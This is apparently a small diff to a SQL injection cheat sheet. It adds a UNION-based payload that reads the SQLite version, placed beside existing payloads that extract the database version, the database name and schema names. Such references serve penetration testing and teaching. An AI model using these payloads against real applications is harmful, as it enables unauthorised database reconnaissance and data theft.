@@ -28,6 +28,7 @@ Pentestermonkey SQL injection cheat sheet (https://github.com/swisskyrepo/Payloa
 ### Info
 	1' UNION SELECT null,@@version-- -
 	1' UNION SELECT null,version()-- -
+	1' UNION SELECT null,sqlite_version()-- -
 	1' UNION SELECT null,@@database-- -
 	1' UNION SELECT null,database()-- -
 	1' union select 1,group_concat(schema_name)from information_schema.schemata-- -
